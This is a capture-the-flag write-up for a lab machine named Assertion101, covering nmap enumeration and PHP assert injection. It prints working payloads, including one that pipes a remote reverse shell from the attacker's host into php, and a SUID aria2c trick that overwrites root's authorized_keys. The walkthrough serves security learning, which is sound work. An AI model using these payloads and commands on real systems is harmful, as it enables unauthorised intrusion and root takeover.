---
layout: default
title : muzec - Assertion101 Writeup
---

![image](https://user-images.githubusercontent.com/69868171/122222062-e5698b80-ce7f-11eb-94bd-d32514e8c964.png)

We always start with an nmap scan.....

```Nmap -sC -sV -oA nmap <Target-IP>```

```
# Nmap 7.91 scan initiated Wed Jun 16 03:12:49 2021 as: nmap -sC -sV -oA nmap 192.168.119.94
Nmap scan report for 192.168.119.94
Host is up (0.39s latency).
Not shown: 963 closed ports, 35 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:ce:aa:cc:02:de:a5:a3:58:5d:da:2b:ef:54:07:f9 (RSA)
|   256 9d:3f:df:16:7a:e1:59:58:84:4a:e3:29:8f:44:87:8d (ECDSA)
|_  256 87:b5:6f:f8:21:81:d3:3b:43:d0:40:81:c0:e3:69:89 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Assertion
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jun 16 03:15:15 2021 -- 1 IP address (1 host up) scanned in 145.78 seconds
```

We having just two open port which is cool now let start enumeration on port HTTP.

### WEB APPLICATION

![image](https://user-images.githubusercontent.com/69868171/122222062-e5698b80-ce7f-11eb-94bd-d32514e8c964.png)

 We can see that the menu at the top of the page contains a page parameter that seems particularly interesting let try LFI to see if it vulnerable.
 
 ![image](https://user-images.githubusercontent.com/69868171/122222678-793b5780-ce80-11eb-91d1-f65a5a72cf3d.png)

But we got nothing just a message back `Not so easy brother!` let try some advance LFI attack on it.

### PHP ASSERTIONS

If you encounter a difficult LFI that appears to be filtering traversal strings such as ".." and responding with something along the lines of "Hacking attempt" or "Nice try!", an 'assert' injection payload may work.

Going from the machine name and the php file extensions, we can guess that the machine is about php assertions.
By using Google to search for ways to bypass php assertions, we find similar challenges and we get some suggestions to try.

```
' and die(show_source('/etc/passwd')) or '
' and die(system("whoami")) or '
```

We find the following payload that works .

![image](https://user-images.githubusercontent.com/69868171/122223468-2f06a600-ce81-11eb-9f63-7c61d9911bd4.png)

Time to get a reverse shell. we can get a shell from our machine copying the shell from `/usr/share/webshells/php/php-reverse-shell.php` and editing it with our local machine’s IP and port.

![image](https://user-images.githubusercontent.com/69868171/122224603-42664100-ce82-11eb-985a-45f6d3136f5d.png)


Make sure to edit the PORT and IP in the reverse shell file. Then let start a web server to serve the file.

`python -m SimpleHTTPServer`

![image](https://user-images.githubusercontent.com/69868171/122225017-ac7ee600-ce82-11eb-96d9-105b6a229ca1.png)

Start our netcat listener.

`nc -nvlp 1337`

![image](https://user-images.githubusercontent.com/69868171/122225090-bf91b600-ce82-11eb-9895-8cd130c2349a.png)

Now let run it.

`http://192.168.119.94/index.php?page=' and die(system("curl http://192.168.49.119:8000/shell.php | php")) or '`

Checking our ncat listener and we have shell.

![image](https://user-images.githubusercontent.com/69868171/122225934-80b03000-ce83-11eb-9b6a-396eaac02e02.png)

Spawning a TTY shell with `python -c 'import pty; pty.spawn ("/bin/bash")'`

### Privilege Escalation

`find  / -perm -u=s -type f 2>/dev/null` 

Checking for SUID binaries.

![image](https://user-images.githubusercontent.com/69868171/122226370-ea303e80-ce83-11eb-822c-845c625fb05a.png)

Our particular target is the `/usr/bin/aria2c` executable, which is a command line download utility. We can use it to overwrite some important files. For example, we can use it to overwrite the root’s authorized_keys file.

Let’s start a web server in our local machine’s .ssh folder to get our public key on the remote machine. If you don’t have an SSH key pair created, you can use the ssh-keygen command.

![image](https://user-images.githubusercontent.com/69868171/122226958-73477580-ce84-11eb-905b-3b091598831f.png)

Now let type ``/usr/bin/aria2c -d /root/.ssh/ -o authorized_keys "http://192.168.49.119:8000/authorized_keys" --allow-overwrite=true`` on the target.

![image](https://user-images.githubusercontent.com/69868171/122227491-eb15a000-ce84-11eb-8765-0945b6369401.png)

Now let SSH with root and we are done.

Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>
